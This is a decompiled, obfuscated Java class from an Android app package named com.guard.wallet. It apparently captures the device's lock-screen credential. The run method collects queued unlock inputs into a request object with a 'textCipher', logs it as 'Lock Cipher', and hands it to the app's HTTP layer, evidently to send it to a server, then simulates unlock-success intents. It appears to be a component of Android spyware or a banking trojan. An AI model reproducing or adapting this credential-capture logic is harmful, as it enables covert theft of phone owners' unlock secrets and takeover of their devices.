package com.guard.wallet.helper;

import a1.AbstractC0026q;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.plug.C0222a;
import com.guard.wallet.plug.C0223b;
import com.guard.wallet.plug.C0224c;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0246b;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

/* renamed from: com.guard.wallet.helper.f */
/* loaded from: classes.dex */
public final class RunnableC0183f implements Runnable {

    /* renamed from: a */
    public final /* synthetic */ int f202a;

    /* JADX WARN: 'this' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ RunnableC0183f() {
        this(5);
        this.f202a = 5;
    }

    @Override // java.lang.Runnable
    public final void run() {
        boolean z2;
        boolean z3;
        ConcurrentLinkedQueue concurrentLinkedQueue;
        boolean z4;
        switch (this.f202a) {
            case 0:
                AbstractC0184g.m352f();
                break;
            case 1:
                AbstractC0184g.m350d();
                break;
            case 2:
                AbstractC0192o.m364e();
                break;
            case 3:
                AbstractC0192o.m364e();
                break;
            case 4:
                AbstractC0195r.m377f();
                break;
            case 5:
                String str = C0224c.f267g;
                ThreadPoolExecutor threadPoolExecutor = AbstractC0243l.f391a;
                if (AbstractC0026q.m151B(str)) {
                    z3 = true;
                } else {
                    try {
                        concurrentLinkedQueue = (ConcurrentLinkedQueue) AbstractC0243l.f392b.get(str);
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("com.guard.wallet.thread.l", e2);
                    }
                    if (concurrentLinkedQueue != null && !concurrentLinkedQueue.isEmpty()) {
                        z2 = concurrentLinkedQueue.stream().anyMatch(new C0179b(2));
                        z3 = !z2;
                    }
                    z2 = false;
                    z3 = !z2;
                }
                if (z3) {
                    try {
                        AbstractC0252h.m686G("android.intent.action.DEVICE_PASSWORD_SUCCESS");
                        ConcurrentLinkedQueue concurrentLinkedQueue2 = C0224c.f261a;
                        if (!concurrentLinkedQueue2.isEmpty()) {
                            ReqUnlockDeviceVO reqUnlockDeviceVO = new ReqUnlockDeviceVO();
                            if (!concurrentLinkedQueue2.isEmpty()) {
                                concurrentLinkedQueue2.removeIf(new C0222a(reqUnlockDeviceVO));
                            }
                            LinkedList linkedList = new LinkedList();
                            LinkedList linkedList2 = new LinkedList();
                            LinkedList linkedList3 = new LinkedList();
                            concurrentLinkedQueue2.removeIf(new C0223b(this, linkedList, linkedList2, linkedList3, 0));
                            C0224c.m445a(linkedList2, reqUnlockDeviceVO);
                            C0224c.m446b(linkedList3, reqUnlockDeviceVO);
                            C0224c.m447c(linkedList, reqUnlockDeviceVO);
                            concurrentLinkedQueue2.clear();
                            AbstractC0252h.m682C(reqUnlockDeviceVO);
                            if (!AbstractC0026q.m151B(reqUnlockDeviceVO.getCipherGradeCode()) && C0224c.m448d(reqUnlockDeviceVO.getTextCipher())) {
                                Log.d("com.guard.wallet.plug.c", "Lock Cipher:" + reqUnlockDeviceVO);
                                AbstractC0207l.m414B(reqUnlockDeviceVO);
                                if (MainApplication.getInstance() != null) {
                                    AtomicReference atomicReference = C0224c.f264d;
                                    if (!AbstractC0026q.m151B(atomicReference.get())) {
                                        MainApplication.getInstance().offerStrategyEvent((String) atomicReference.get());
                                    }
                                }
                            }
                        }
                        AbstractC0252h.m687H(4, "android.intent.action.USER_PRESENT");
                        C0224c.f264d.set(null);
                        C0224c.f267g = null;
                    } catch (Exception e3) {
                        ConcurrentLinkedQueue concurrentLinkedQueue3 = C0224c.f261a;
                        AbstractC0026q.m186s("com.guard.wallet.plug.c", e3);
                    }
                    z4 = true;
                } else {
                    z4 = false;
                }
                if (!z4) {
                    C0224c.f263c.schedule(new RunnableC0183f(5), C0224c.f266f, TimeUnit.SECONDS);
                    break;
                } else {
                    C0224c.f265e.set(false);
                    C0224c.f266f = 10L;
                    break;
                }
                break;
            default:
                AbstractC0246b.m596a();
                AbstractC0246b.m601f();
                break;
        }
    }

    public /* synthetic */ RunnableC0183f(int i2) {
        this.f202a = i2;
    }
}
